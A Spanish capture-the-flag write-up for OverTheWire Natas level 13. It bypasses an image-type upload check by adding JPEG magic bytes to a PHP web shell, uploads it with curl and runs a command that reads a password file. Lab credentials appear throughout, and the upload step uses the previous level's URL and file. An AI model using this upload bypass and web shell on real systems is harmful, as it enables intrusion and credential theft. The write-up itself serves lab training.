# Natas 13

#### URL: http://natas13.natas.labs.overthewire.org
#### Credenciales: natas13:trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC

Parecido al nivel 12, podemos subir un archivo pero esta vez comprueba si es una imagen por medio de la revision de su numero magico.

``` php
} else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
```

Podemos agregar los bytes con que inicia y termina un archivo jpg para sobrepasar la verificacion.

``` bash
echo "\xff\xd8\xff\xe0" > modshell.php
cat shell.php >> modshell.php
echo "\xff\xd9" >> modshell.php
```

Subimos el archivo

``` bash
curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB http://natas12.natas.labs.overthewire.org/ -F "uploadedfile=@/home/kalcast/Laboratorio/shell.php" -F "filename=shell.php" -F "MAX_FILE_SIZE=1000"
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas13", "pass": "trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC" };</script></head>
<body>
<h1>natas13</h1>
<div id="content">
For security reasons, we now only accept image files!<br/><br/>

The file <a href="upload/7hpf170ehu.php">upload/7hpf170ehu.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```
Accedemos a la ruta del archivo con el parametro `cmd=cat /etc/natas_webpass/natas14`

```
curl -u natas13:trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC "http://natas13.natas.labs.overthewire.org/upload/7hpf170ehu.php?cmd=cat%20/etc/natas_webpass/natas14"
��
  <pre>z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
</pre> 
```

`natas14:z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ`
